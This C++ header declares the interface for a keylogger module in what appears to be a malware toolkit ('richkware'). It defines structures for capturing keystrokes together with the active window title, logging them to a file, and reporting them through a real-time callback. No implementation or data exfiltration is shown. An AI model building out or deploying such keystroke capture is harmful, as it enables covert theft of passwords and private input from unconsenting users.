#pragma once

#include "../core/types.hpp"
#include <string>
#include <memory>
#include <functional>
#include <vector>

namespace richkware::modules {

struct KeyEvent {
    int key_code{0};
    std::string key_name;
    bool pressed{false};
    bool released{false};
    core::TimePoint timestamp;
    std::string window_title;  // Active window when key was pressed
};

struct KeyloggerConfig {
    bool capture_special_keys{true};
    bool capture_mouse_events{false};
    bool log_window_changes{true};
    std::string log_file_path;  // Optional file to save keystrokes
    std::function<void(const KeyEvent&)> event_callback;  // Real-time callback
};

/**
 * @brief Keylogger interface for keyboard input capture
 */
class IKeylogger {
public:
    virtual ~IKeylogger() = default;

    /**
     * @brief Start keylogging
     * @param config Keylogger configuration
     * @return Result indicating success or failure
     */
    [[nodiscard]] virtual core::Result<void> start(const KeyloggerConfig& config) = 0;

    /**
     * @brief Stop keylogging
     * @return Result indicating success or failure
     */
    [[nodiscard]] virtual core::Result<void> stop() = 0;

    /**
     * @brief Check if keylogger is running
     * @return true if running, false otherwise
     */
    [[nodiscard]] virtual bool is_running() const noexcept = 0;

    /**
     * @brief Get captured keystrokes as string
     * @return Captured keystrokes
     */
    [[nodiscard]] virtual std::string get_keystrokes() const = 0;

    /**
     * @brief Clear captured keystrokes
     */
    virtual void clear_keystrokes() = 0;

    /**
     * @brief Get recent key events
     * @param count Number of events to retrieve
     * @return Vector of recent key events
     */
    [[nodiscard]] virtual std::vector<KeyEvent> get_recent_events(size_t count) const = 0;
};

/**
 * @brief Keylogger implementation
 */
class Keylogger : public IKeylogger {
public:
    Keylogger();
    ~Keylogger() override;

    // Non-copyable, movable
    Keylogger(const Keylogger&) = delete;
    Keylogger& operator=(const Keylogger&) = delete;
    Keylogger(Keylogger&&) = default;
    Keylogger& operator=(Keylogger&&) = default;

    [[nodiscard]] core::Result<void> start(const KeyloggerConfig& config) override;
    [[nodiscard]] core::Result<void> stop() override;
    [[nodiscard]] bool is_running() const noexcept override;
    [[nodiscard]] std::string get_keystrokes() const override;
    void clear_keystrokes() override;
    [[nodiscard]] std::vector<KeyEvent> get_recent_events(size_t count) const override;

private:
    class Impl;
    std::unique_ptr<Impl> pimpl_;
};

} // namespace richkware::modules